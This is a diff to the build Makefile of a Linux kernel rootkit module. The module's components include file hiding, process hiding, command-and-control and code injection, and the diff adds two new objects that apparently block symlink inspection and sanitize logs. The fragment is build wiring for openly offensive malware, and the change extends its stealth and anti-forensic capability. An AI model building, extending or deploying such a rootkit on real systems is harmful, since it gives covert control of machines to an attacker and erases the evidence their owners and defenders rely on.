@@ -18,7 +18,9 @@ rootkit-objs := src/rootkit.o \
                 src/file_hide.o \
                 src/proc_hide.o \
                 src/c2.o \
-                src/inject.o
+                src/inject.o \
+				src/slink_block.o \
+				src/log_sanitize.o
 
 # Tell the compiler where to find our headers
 ccflags-y := -I$(src)/src
